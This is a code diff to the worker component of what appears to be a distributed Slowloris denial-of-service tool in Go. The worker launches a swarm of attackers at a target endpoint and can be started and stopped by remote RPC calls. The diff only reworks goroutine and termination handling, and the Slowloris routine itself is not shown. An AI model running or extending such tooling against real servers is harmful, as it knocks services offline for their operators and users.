@@ -46,41 +46,19 @@ func (worker *Worker) Attack(req int, res *int) error {
   worker.WorkerAttackers = createSwarm(worker.WorkerState.NumAttackers, worker.WorkerState.Endpoint)
 
   // dispatch goroutines to initiate attacks with each attacker in swarm
-  for _, attacker := range worker.WorkerAttackers {
-    go func() {
-      for {
-        select {
-        case <-worker.doneChan:
-          worker.exitChan<-1
-          break
-        default:
-          loris(attacker, worker.WorkerState.Delay, worker.WorkerHeaders.Base, worker.WorkerHeaders.Loris, worker.WorkerState.Endpoint)
-        }
-      }
-    }()
-  }
-
-  // dispatch goroutine to display stats
   go func() {
+    for _, attacker := range worker.WorkerAttackers {
+      go loris(attacker, worker.WorkerState.Delay, worker.WorkerHeaders.Base, worker.WorkerHeaders.Loris, worker.WorkerState.Endpoint)
+    }
+
+    // display system stats, waiting each time for the next round
+    // of server writes
     for {
-      select {
-      case <-worker.doneChan:
-        worker.exitChan<-1
-        break
-      default:
-        // display system stats, waiting each time for the next round
-        // of server writes
-        time.Sleep(time.Duration(worker.WorkerState.Delay) * time.Second)
-        displayStats(worker.WorkerAttackers)
-      }
+          time.Sleep(time.Duration(worker.WorkerState.Delay) * time.Second)
+          displayStats(worker.WorkerAttackers)
     }
   }()
-
-  fmt.Println("blocked on doneChan")
-  for i := 0; i < len(worker.WorkerAttackers) + 1; i++ {
-    <-worker.exitChan
-  }
-
+  <-worker.doneChan
   return nil
 }
 
@@ -88,8 +66,9 @@ func (worker *Worker) Attack(req int, res *int) error {
 // asynchronously execute Attack() to initiate attack, and later on be able
 // to call Terminate() to unblock Attack()
 func (worker *Worker) Terminate(req int, res *int) error {
+  fmt.Println("TERMINATING")
+  worker.doneChan<-1
   *res = 0
-  close(worker.doneChan)
   return nil
 }
 
@@ -116,14 +95,12 @@ func Connect(worker *Worker) {
 const version = 0.2
 
 func main() {
-  // create worker structure
   worker := Initialize()
   // register worker as exported type
   rpc.Register(worker)
 
   // initialize worker net listener, and listen for traffic on specified Port
   Connect(worker)
-
   // accept RPC to net listener for specified host Port
   rpc.Accept(worker.listener)
 }
